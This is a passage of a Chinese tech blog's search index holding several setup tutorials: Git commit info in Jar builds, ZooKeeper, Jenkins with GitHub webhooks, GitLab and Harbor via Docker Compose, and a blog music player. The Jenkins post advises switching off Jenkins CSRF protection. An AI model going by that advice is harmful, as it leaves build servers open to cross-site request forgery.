打包发布版本可能会遇到自己的提交不起作用的情况，排查比较困难，可能需要拉下服务器上的 Jar 包，然后反编译查看是否包含自己的提交记录。如果使用的是 Git 作为 SCM，可以使用 git-commit-id-plugin 插件，该插件可以很方便地在项目打包时，将 Git Commit 信息写入 git.properties 文件并存放在 Jar 包中，这样就可以很方便的查看 Jar 包对应的提交记录。 12345678910111213141516171819202122232425262728&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;io.github.git-commit-id&lt;/groupId&gt; &lt;artifactId&gt;git-commit-id-maven-plugin&lt;/artifactId&gt; &lt;version&gt;4.9.9&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;get-the-git-infos&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;revision&lt;/goal&gt; &lt;/goals&gt; &lt;phase&gt;initialize&lt;/phase&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;failOnNoGitDirectory&gt;false&lt;/failOnNoGitDirectory&gt; &lt;generateGitPropertiesFile&gt;true&lt;/generateGitPropertiesFile&gt; &lt;!-- 日期格式 --&gt; &lt;dateFormat&gt;yyyy-MM-dd HH:mm:ss&lt;/dateFormat&gt; &lt;includeOnlyProperties&gt; &lt;includeOnlyProperty&gt;^git.build.(time|version)$&lt;/includeOnlyProperty&gt; &lt;includeOnlyProperty&gt;^git.commit.(id|message|time).*$&lt;/includeOnlyProperty&gt; &lt;/includeOnlyProperties&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"Linux 安装 ZooKeeper 单机实例",url:"/posts/6edb1958.html",text:'前言本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 安装 Oracle JDK安装 Oracle JDK 不是必需的，如果不想安装可以使用 Open-JDK 替代，而且大多数 Linux 发行版自带 Open-JDK。 1234567891011121314151617181920212223242526272829303132# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 删除压缩文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 如果已安装Open-JDK，则覆盖Java命令的软链接# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK的环境变量，在配置文件末尾追加以下内容即可# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) 下载 ZooKeeper 压缩包 ZooKeeper 官网下载 安装 ZooKeeper12345678910111213141516171819202122232425262728293031323334353637383940# 移动压缩文件到/usr/local目录# mv zookeeper-3.4.13.tar.gz /usr/local# 解压压缩文件# cd /usr/local# tar -xvf zookeeper-3.4.13.tar.gz# 删除压缩文件# rm -rf zookeeper-3.4.13.tar.gz# 创建ZooKeeper的数据目录与日志目录# mkdir -p /usr/local/zookeeper-3.4.13/data# mkdir -p /usr/local/zookeeper-3.4.13/log# 创建配置文件# cd /usr/local/zookeeper-3.4.13/conf# cp zoo_sample.cfg zoo.cfg# 修改ZooKeeper的默认配置# vim zoo.cfg# 定义的基准时间间隔，单位：毫秒tickTime=2000# 默认端口clientPort=2181# 数据文件夹dataDir=/usr/local/zookeeper-3.4.13/data# 修改ZooKeeper的日志配置# vim log4j.properties# 日志文件夹zookeeper.log.dir=/usr/local/zookeeper-3.4.13/log# 配置环境变量# vim /etc/profileZOOKEEPER_HOME=/usr/local/zookeeper-3.4.13PATH=$PATH:ZOOKEEPER_HOME/binexport ZOOKEEPER_HOME PATH# 使环境变量生效# source /etc/profile ZooKeeper 服务管理1234567891011121314151617# 进入ZooKeeper的bin目录# cd /usr/local/zookeeper-3.4.13/bin# 停止服务# ./zkServer.sh stop# 后台启动服务# ./zkServer.sh start# 前台启动服务# ./zkServer.sh start-foreground# 查看服务的运行状态# ./zkServer.sh status# 重启服务# ./zkServer.sh restart 客户端连接 ZooKeeper 服务器123456789101112131415161718192021222324252627282930# 进入ZooKeeper的bin目录$ cd /usr/local/zookeeper-3.4.13/bin# 客户端连接ZooKeeper服务器端$ ./zkCli.sh -server 127.0.0.1:2181# 创建节点[zk: 127.0.0.1:2181(CONNECTED) 1] create -e /test-node 123456# 列出所有根节点[zk: 127.0.0.1:2181(CONNECTED) 2] ls /[test-node, zookeeper]# 获取指定节点的值[zk: 127.0.0.1:2181(CONNECTED) 3] get /test-node123456cZxid = 0x4ctime = Fri Feb 22 02:27:43 UTC 2019mZxid = 0x4mtime = Fri Feb 22 02:27:43 UTC 2019pZxid = 0x4cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x1000a766c5e0001dataLength = 6numChildren = 0# 断开客户端连接[zk: 127.0.0.1:2181(CONNECTED) 4] quit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Jenkins 入门教程之四 Jenkins 与 Git 持续集成实战",url:"/posts/c7372b8f.html",text:'上篇：Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战 Jenkins+GitHub 持续集成环境的搭建，与 Jenkins+SVN 持续集成环境的搭建很相似，下面只简单介绍 Jenkins+GitHub 的重点内容，额外的操作可参考上一篇文章。 Jenkins+GitHub 持续集成环境搭建要点 Jenkins 需要部署到外网上，因为内网地址 GitHub 是无法访问到的，可以租用阿里云等云服务平台 Jenkins 所在的主机上需要安装 Git，通过 Git 程序从 GitHub 上 clone 代码 在 Jenkins 内需要指定 Git 程序位置，和指定 JDK、Maven 的位置类似 在 GitHub 上使用 repository 的 WebHook 方式远程触发 Jenkins 构建 在 Jenkins 内关闭 “防止跨站点请求伪造” Jenkins 配置 Git 程序的位置 构建任务中配置 Github 仓库的地址 Jenkins 关闭” 防止跨站点请求伪造” 找到”Manage Jenkins” -&gt; “Configure Global Security” -&gt; “CSRF Protection”，取消勾选 “防止跨站点请求伪造”，然后保存设置。 Github 配置 Webhooks Github 配置 Webhooks 的目的是当 Git 客户端 Push 代码到 Github 仓库后，通知 Jenkins Clone 最新的代码到本地并进行构建发布。如果使用 Gitolite 搭建 Git 服务器，可以在 Git 仓库目录下的 hooks/post-update 钩子脚本中添加远程触发 Jenkins 构建的 CURL 命令。下面填写的 URL 是远程触发 Jenkins 构建的请求地址，将”example.com” 替换为 Jenkins 所在主机的外网 IP 或者域名，参数 token 的值是 API Token。关于如何配置远程触发 Jenkins 构建，详细步骤可参考看上一篇文章。完整的 URL 示例如下：http://example.com/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 验证 Github 的 Webhooks 是否正常工作 本地修改项目代码，然后 Push 到 Github 远程仓库，观察 Jenkins 构建任务页面左边的小窗口（构建历史）内是否有新构建历史出现，如果有则说明 Webhooks 正常工作。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Git 之九 - Docker 搭建 Gitlab 服务器",url:"/posts/ec27dc79.html",text:'前言 Docker 环境下官方提供三种方式安装 Gitlab，第一种是基于 Docker 引擎安装，第二种是集群环境下安装，第三种是通过 Docker-Compose 安装。本文将介绍如何通过 Docker-Compose 安装 Gitlab，如果需要 Docker 官方安装 Gitlab 的教程，可点击这里。 安装 Docker 站内教程：Docker 之一 Docker 介绍与安装 安装 Docker-Compose 站内教程：Docker 之十七 Docker-Compose 安装与使用 Gitlab 数据卷挂载介绍 创建 Docker-Compose 配置文件，使用默认端口 1234567891011121314151617181920# 创建目录# mkidr -p /usr/local/gitlab# 创建docker-compose.yml配置文件# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always hostname: \'gitlab.example.com\' environment: GITLAB_OMNIBUS_CONFIG: | external_url \'https://gitlab.example.com\' ports: - \'80:80\' - \'443:443\' - \'22:22\' volumes: - \'/srv/gitlab/config:/etc/gitlab\' - \'/srv/gitlab/logs:/var/log/gitlab\' - \'/srv/gitlab/data:/var/opt/gitlab\' 创建 Docker-Compose 配置文件，在 Docker 容器内使用自定义端口 12345678910111213141516171819202122# 创建目录# mkidr -p /usr/local/gitlab# 创建docker-compose.yml配置文件，在Docker容器内使用自定义端口# 此处重点是在Docker容器内使用自定义端口，而非简单修改Docker容器的端口映射# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always hostname: \'gitlab.example.com\' environment: GITLAB_OMNIBUS_CONFIG: | nginx[\'listen_port\'] = 9090 external_url \'http://gitlab.example.com:9090\' gitlab_rails[\'gitlab_shell_ssh_port\'] = 2224 ports: - \'9090:9090\' - \'2224:2224\' volumes: - \'/srv/gitlab/config:/etc/gitlab\' - \'/srv/gitlab/logs:/var/log/gitlab\' - \'/srv/gitlab/data:/var/opt/gitlab\' Docker-Compose 安装 Gitlab 12345678910111213# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 拉取最新的Gitlab镜像# docker-compose pull# 创建并启动Gitlab容器# docker-compose up -d# 查看Gitlab容器的运行情况（使用在Docker容器内指定自定义端口的docker-compose配置）# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES23a12382baff gitlab/gitlab-ce:latest "/assets/wrapper" 4 minutes ago Up 4 minutes (healthy) 22/tcp, 80/tcp, 0.0.0.0:2224-&gt;2224/tcp, 443/tcp, 0.0.0.0:9090-&gt;9090/tcp gitlab_web_1 测试访问 Gitlab 启动 Gitlab 容器后，稍等三四分钟然后在浏览器输入以下地址访问 Gitlab 的 Web 页面： http://127.0.0.1 或者 http://127.0.0.1:9090 安装后配置 Gitlab 123456789101112131415161718# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 编辑docker-compose的配置文件，添加相关配置# vim docker-compose.ymlenvironment: GITLAB_OMNIBUS_CONFIG: | nginx[\'listen_port\'] = 9090 ....（省略）# 停止Giblab容器# docker-compose stop# 删除Giblab容器（数据卷的数据默认不会被删除）# docker-compose down# 创建并启动Gitlab容器# docker-compose up -d 安装后更新、升级 Gitlab 123456789101112131415161718# 进入配置文件docker-compose.yml所在的目录# cd /usr/local/gitlab# 停止Giblab容器# docker-compose stop# 在配置文件docker-compose.yml中指定Gitlab新的版本号，或者直接指定最新的版本，即“gitlab/gitlab-ce:latest”# vim docker-compose.ymlweb: image: \'gitlab/gitlab-ce:latest\' restart: always ....（省略）# 拉取最新的Gitlab镜像# docker-compose pull# 创建并启动Gitlab容器# docker-compose up -d 注意事项 为了以后方便更新 Gitlab 镜像，同时更好地处理更新镜像带来的向前兼容问题，建议首次安装或者更新 Gitlab 的时候，直接指定具体需要安装的版本号，而不是直接使用 latest 版本号。Gitlab-CE 的版本号可以从这里获取。 123456# 在配置文件docker-compose.yml中指定Gitlab的版本号# vim /usr/local/gitlab/docker-compose.ymlweb: image: \'gitlab/gitlab-ce:11.7.5-ce.0\' restart: always ....（省略） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 版本控制"},{title:"Hexo 全局添加 APlayer 音乐播放器",url:"/posts/cfdad023.html",text:'相关站点 APlayer 官网 APlayer Github Hexo-Tag-Aplayer 音乐直链搜索工具 基于 Yilia 主题全局添加 APlayer 音乐播放器 编辑 Yilia 的模版文件 hexo-theme-yilia/layout/_partial/left-col.ejs，在文件的末尾追加以下代码，其中歌曲的歌词文件、封面图片、URL 都可以从通过音乐直链搜索工具获取，也可以直接使用服务器本地资源文件。值得一提的是，如果下面的代码不能将 APlayer 播放器固定到理想的页面位置，可自行修改 div 标签的样式和 APlayer 的 fixed 参数值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;% if(theme.aplayer.enable) { %&gt;&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"&gt;// 这里div的样式是笔者自己修改过的，你可以直接使用APlayer官方的原配置：&lt;div id="aplayer"&gt;&lt;/div&gt;&lt;div id="aplayer" style="position:absolute;left;0;bottom:0;"&gt;&lt;/div&gt;&lt;script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.jsdelivr.net/npm/color-thief-don@2.0.2/src/color-thief.js"&gt;&lt;/script&gt;&lt;script&gt; const ap = new APlayer({ container: document.getElementById(\'aplayer\'), autoplay: false, //自动播放 listFolded: true, //播放列表默认折叠 listMaxHeight: 90, //播放列表最大高度 order: \'list\', //音频循环顺序, 可选值: \'list\', \'random\' loop: \'all\', //音频循环播放, 可选值: \'all\', \'one\', \'none\' theme: \'#e9e9e9\', //切换音频时的主题色，优先级低于audio.theme preload: \'none\', //音频预加载，可选值: \'none\', \'metadata\', \'auto\' mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 lrcType: 3, //歌词格式，可选值：3（LRC文件歌词格式），1（JS字符串歌词格式） volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 fixed: false, //吸底模式（fixed:true），迷你模式（mini:true），普通模式（注释此行或者设置fixed:false） audio: [{ name: \'平凡之路\', artist: \'朴树\', lrc: \'/downloads/lrc/平凡之路-朴树.lrc\', cover: \'http://p2.music.126.net/W_5XiCv3rGS1-J7EXpHSCQ==/18885211718782327.jpg?param=300x300\', url: \'http://fs.open.kugou.com/cd5cbe8edb012e4f77b0857cefc0956e/5c66accf/G097/M08/0A/1F/AYcBAFkQGpOAMUpuAEm-3SlWMyk951.mp3\' }, { name: \'后会无期\', artist: \'G.E.M.邓紫棋\', lrc: \'/downloads/lrc/后会无期-G.E.M.邓紫棋.lrc\', cover: \'http://p1.music.126.net/vpvPajo3kn88nHc7jUjeWQ==/5974746185758035.jpg?param=300x300\', url: \'http://m10.music.126.net/20190215193113/e5afc8b5376136029366f2053cf30f85/ymusic/2c87/6ec3/582e/0d572dcc04f8de34133c0f364b74c30c.mp3\' } ] }); //实现切换音频时，根据音频的封面图片自适应主题色 const colorThief = new ColorThief(); const setTheme = (index) =&gt; { if (!ap.list.audios[index].theme) { colorThief.getColorAsync(ap.list.audios[index].cover, function(color) { ap.theme(`rgb(${color[0]}, ${color[1]}, ${color[2]})`, index); }); } }; setTheme(ap.list.index); ap.on(\'listswitch\', (data) =&gt; { setTheme(data.index); });&lt;/script&gt;&lt;% } %&gt; 配置 Yilia 主题 编辑 Yilia 主题的配置文件 hexo-theme-yilia/_config.yml，在文件末尾追加以下内容。 12aplayer: enable: true 重新构建博客 提示，若音频文件使用的是本地资源文件，同时通过 hexo server 提供 Web 服务，那么将无法通过 APlayer 的进度条调节播放进度，此时需要使用 Nginx、Apache 等 Web 服务器。 1234567891011# 进入博客的根目录$ cd /blogroot# 通过Hexo清理Public目录$ hexo clean# 通过Hexo构建静态文件$ hexo generate# 通过Hexo启动服务$ hexo server 扩展建议 若希望日后方便地添加或删除歌曲，建议将歌曲信息写在单独的 Json 文件中，JavaScript 代码初始化 APlayer 音乐播放器时动态读取 Json 文件，那么日后只需要编辑歌曲的 Json 文件就可以达到动态更新歌曲列表目的，本站的音乐播放器使用了该方法。 页面切换后音频播放中断 当博客的 Web 页面切换后，音频播放会中断，建议使用 Pjax 来解决，这是下方评论区网友给出的方案，暂时未亲测。 最终效果图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"Docker 之十六搭建私有仓库管理系统 Harbor",url:"/posts/99d575a6.html",text:'相关站点 Harbor 官网 Harbor Docs Harbor Github Harbor Releases Harbor 介绍 Harbor 是 VMware 公司开源的一个用于存储和分发 Docker 镜像的企业级 Registry 服务器，以 Docker 开源的 Registry 为基础，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源 Docker Distribution。作为一个企业级私有 Registry 服务器，Harbor 提供了更好的性能和安全，提升用户使用 Registry 构建和运行环境传输镜像的效率。Harbor 支持安装在多个 Registry 节点的镜像资源复制，镜像全部保存在私有 Registry 中，确保数据和知识产权在公司内部网络中管控。另外，Harbor 也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。 Harbor 特性 基于角色的访问控制（Role Based Access Control） 基于策略的镜像复制（Policy based image replication） 镜像的漏洞扫描（Vulnerability Scanning） AD/LDAP 集成（LDAP/AD support） 镜像的删除和空间清理（Image deletion &amp; garbage collection） 友好的管理 UI（Graphical user portal） 审计日志（Audit logging） RESTful API 部署简单（Easy deployment） Harbor 组件 依赖的外部组件: Nginx（Proxy）: Harbor 的 Registry、UI、Token 等服务，通过一个前置的反向代理统一接收浏览器、Docker 客户端的请求，并将请求转发给后端不同的服务。 Registry v2: Docker 官方镜像仓库，负责储存 Docker 镜像，并处理 Docker Push/Pull 命令。由于我们要对用户进行访问控制，即不同用户对 Docker 镜像有不同的读写权限，Registry 会指向一个 Token 服务，强制用户的每次 Docker Push/Pull 请求都要携带一个合法的 Token, Registry 会通过公钥对 Token 进行解密验证。 Database（MySQL/Postgresql）：为 Core Services 提供数据库服务，负责储存用户权限、审计日志、Docker 镜像分组信息等数据。 Harbor 自己的组件: Core Services（Admin Server）: 这是 Harbor 的核心功能，主要提供以下服务： API：提供 Harbor RESTful API UI：提供图形化界面，帮助用户管理 Registry 上的镜像，并对用户进行授权。 Webhook：为了及时获取 Registry 上镜像状态变化的情况，在 Registry 上配置 Webhook，把状态变化传递给 UI 模块。 Auth 服务：负责根据用户权限给每个 Docker Push/Pull 命令签发 Token。Docker 客户端向 Registry 服务发起的请求，如果不包含 Token，会被重定向到这里，获得 Token 后再重新向 Registry 进行请求。 Replication Job Service：提供多个 Harbor 实例之间的镜像同步功能。 Log Collector：为了帮助监控 Harbor 运行，负责收集其他组件的日志，供日后进行分析。 Harbor 架构图 Harbor 安裝方式 不建议使用 Kubernetes 来安裝，原因是镜像仓库非常重要，尽量保证安裝和维护的简洁性，因此这里直接使用 Docker Compose 的方式进行安裝。事实上 Harbor 的每个组件都是以 Docker 容器的形式构建，官方也是使用 Docker Compose 来对它进行安裝。Harbor 官方提供以下三种安裝方式: 在线安装：从 Docker Hub 下载 Harbor 的镜像来安装，由于 Docker Hub 比较慢，建议 Docker 配置好加速器。 离线安装：这种方式应对与安裝主机没联网的情况使用，需要提前下载离线安装包到本地。 OVA 安装：这个主要用 vCentor 环境时使用。 Harbor 安装环境说明 Harbor 以容器的形式进行安装，因此可以被安装到任何支持 Docker 的 Linux 发行版，本教程的安装环境如下： 环境名称 版本 linux 发行版 CentOS Linux release 7.6.1810 (Core) docker-ce 18.09.0 docker-compose 1.24.0-rc1 harbor 1.7.1 harbor 安装方式 在线安装 harbor 安装位置 /usr/local/harbor 安装 Docker 站内教程：Docker 之一 Docker 介绍与安装 安装 Docker-Compose 站内教程：Docker 之十七 Docker-Compose 安装与使用 安装 Harbor Harbor 的在线或者离线安装程序下载地址可以从这里获取，如果下载失败，请自备梯子。 1234567891011121314151617181920212223242526272829303132333435# 安装方式分为在线安装和离线安装两种方式，这里采用在线安装方式# 下载在线安装程序# wget -P /usr/local https://storage.googleapis.com/harbor-releases/release-1.7.0/harbor-online-installer-v1.7.1.tgz# 解压下载文件# tar zxf /usr/local/harbor-online-installer-v1.7.1.tgz -C /usr/local/# 修改配置文件，根据自己的需求进行修改# vim /usr/local/harbor/harbor.cfg# 本机IP或者域名，不能是127.0.0.1或者localhosthostname = 192.168.1.130# 系统Harbor管理员的密码harbor_admin_password = Harbor12345# 禁止用户注册self_registration = off# 设置只有管理员可以创建项目project_creation_restriction = adminonly# 由于Harbor的Nginx组件默认会监听宿主机的80、443、4443端口，如果需要更改Nginx的端口映射，可以修改以下配置文件# vim /usr/local/harbor/docker-compose.yml ports: - 8082:80 - 443:443 - 4443:4443# 如果上面更改了Nginx的80端口映射，此时还需要编辑Harbor的配置文件，修改hostname加上指定的端口号# vim harbor.cfghostname = 192.168.1.130:8082# 执行安装脚本# /usr/local/harbor/install.sh# Harbar的日志目录是：/var/log/harbor# Harbar相关数据卷的挂载目录默认是宿主机的/data目录，如果重新安装Harbar并在配置文件里更改了数据库密码，则需要删除/data目录，否则Harbor部分组件会启动失败 安装 Harbor 的日志信息 ★查看详细日志信息★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135[Step 0]: checking installation environment ...Note: docker version: 18.09.0Note: docker-compose version: 1.24.0[Step 1]: preparing environment ...Generated and saved secret to file: /data/secretkeyGenerated configuration file: ./common/config/nginx/nginx.confGenerated configuration file: ./common/config/adminserver/envGenerated configuration file: ./common/config/core/envGenerated configuration file: ./common/config/registry/config.ymlGenerated configuration file: ./common/config/db/envGenerated configuration file: ./common/config/jobservice/envGenerated configuration file: ./common/config/jobservice/config.ymlGenerated configuration file: ./common/config/log/logrotate.confGenerated configuration file: ./common/config/registryctl/envGenerated configuration file: ./common/config/core/app.confGenerated certificate, key file: ./common/config/core/private_key.pem, cert file: ./common/config/registry/root.crtThe configuration files are ready, please use docker-compose to start the service.[Step 2]: checking existing instance of Harbor ...[Step 3]: starting Harbor ...Creating network "harbor_harbor" with the default driverPulling log (goharbor/harbor-log:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-log321a8da5ee1f: Pull completee58cb02d4a79: Pull completeb1addcae27cf: Pull complete0add5fe71c61: Pull complete701d7cb4751e: Pull completeae052802ba8f: Pull complete474572a6c946: Pull completeDigest: sha256:1465ec82b77534eb4687093fff91c752ac655d4ed1fb7e7b23bb6e3905a1ef18Status: Downloaded newer image for goharbor/harbor-log:v1.7.1Pulling registry (goharbor/registry-photon:v2.6.2-v1.7.1)...v2.6.2-v1.7.1: Pulling from goharbor/registry-photon321a8da5ee1f: Already exists427e471dc5bb: Pull complete79d644c380a9: Pull completed1ee69ba441f: Pull complete13ee399ae5e6: Pull complete52da6cf3d71f: Pull completee6dfe8d3336d: Pull complete2261e5dd4591: Pull completeDigest: sha256:dccc66572458001ed3b8f8ead0f0a89f0455747992528bafb857ed031bae07dcStatus: Downloaded newer image for goharbor/registry-photon:v2.6.2-v1.7.1Pulling registryctl (goharbor/harbor-registryctl:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-registryctl321a8da5ee1f: Already exists60ab2a220157: Pull complete685cb36a4aa6: Pull complete6ab9cbb7c05b: Pull completed66f51b51c32: Pull complete152d893b8817: Pull completeDigest: sha256:de4b9c6684b7005379df6c48c05d2884c6b3cced0c98f8814c4506d71f781b9cStatus: Downloaded newer image for goharbor/harbor-registryctl:v1.7.1Pulling postgresql (goharbor/harbor-db:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-db321a8da5ee1f: Already exists3b62caa7690c: Pull complete0c0b8f8af809: Pull complete68db7c777555: Pull complete810390407c8c: Pull completed99f5e0b551e: Pull complete0dedd5da1f5d: Pull complete5e156cfb841f: Pull complete0433d5b9e1ad: Pull completeDigest: sha256:6031b1ed9337c3af78e627ecd45351e0e0d630b83cf45e1c924cb3e5b006cb44Status: Downloaded newer image for goharbor/harbor-db:v1.7.1Pulling adminserver (goharbor/harbor-adminserver:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-adminserver321a8da5ee1f: Already exists3235adc5dfba: Pull complete36df358268ae: Pull completef07cf44733c3: Pull complete153223fc88f2: Pull completeDigest: sha256:5a539a2c733ca9efcd62d4561b36ea93d55436c5a86825b8e43ce8303a7a0752Status: Downloaded newer image for goharbor/harbor-adminserver:v1.7.1Pulling core (goharbor/harbor-core:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-core321a8da5ee1f: Already exists95d433145bab: Pull complete49d3e2a9635a: Pull complete6a4cbc768efe: Pull complete7e7d30cebeb5: Pull completeDigest: sha256:2791572f21aeaa7e62d3ee90b5b7ced3903633d9809d19fa32d3a524d580fc12Status: Downloaded newer image for goharbor/harbor-core:v1.7.1Pulling portal (goharbor/harbor-portal:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-portal321a8da5ee1f: Already exists0c2edbea17ee: Pull complete35f0e6ee2803: Pull complete815b36cabaa4: Pull completeDigest: sha256:37a16e2ab4dc1499b25ce4a3f42c34a3c524fcfcd31f7433a459a738d4cec3b6Status: Downloaded newer image for goharbor/harbor-portal:v1.7.1Pulling redis (goharbor/redis-photon:v1.7.1)...v1.7.1: Pulling from goharbor/redis-photon321a8da5ee1f: Already existse37a237fdce1: Pull completea533db83c439: Pull complete60f1956f70fa: Pull completec7eecf8b746b: Pull completeDigest: sha256:9a10e8d0c3640c0207d94409fc61783643a2f5d866d4e1136c0718b3a5ac3015Status: Downloaded newer image for goharbor/redis-photon:v1.7.1Pulling jobservice (goharbor/harbor-jobservice:v1.7.1)...v1.7.1: Pulling from goharbor/harbor-jobservice321a8da5ee1f: Already exists4809bd624b7e: Pull complete889c696c8f56: Pull complete72d181b0302b: Pull completeDigest: sha256:c6706d51a3476235d8e801806141aa8e7279608268fca8be8ccd2e74987db093Status: Downloaded newer image for goharbor/harbor-jobservice:v1.7.1Pulling proxy (goharbor/nginx-photon:v1.7.1)...v1.7.1: Pulling from goharbor/nginx-photon321a8da5ee1f: Already exists044755eb163c: Pull completeDigest: sha256:c941c386eb99613b4c7481b9e433372bfac07beddb52a4e73dd7356ac8373189Status: Downloaded newer image for goharbor/nginx-photon:v1.7.1Creating harbor-log ... doneCreating harbor-adminserver ... doneCreating registryctl ... doneCreating harbor-db ... doneCreating registry ... doneCreating redis ... doneCreating harbor-core ... doneCreating harbor-portal ... doneCreating harbor-jobservice ... doneCreating nginx ... done✔ ----Harbor has been installed and started successfully.----Now you should be able to visit the admin portal at http://192.168.1.130.For more details, please visit https://github.com/goharbor/harbor . Harbor启动/停止/重启 1234567891011121314151617181920212223242526272829303132333435363738# 如果某个Harbor组件启动失败，可以在日志目录/var/log/harbor下查看具体的日志信息，进一步定位启动失败的原因# 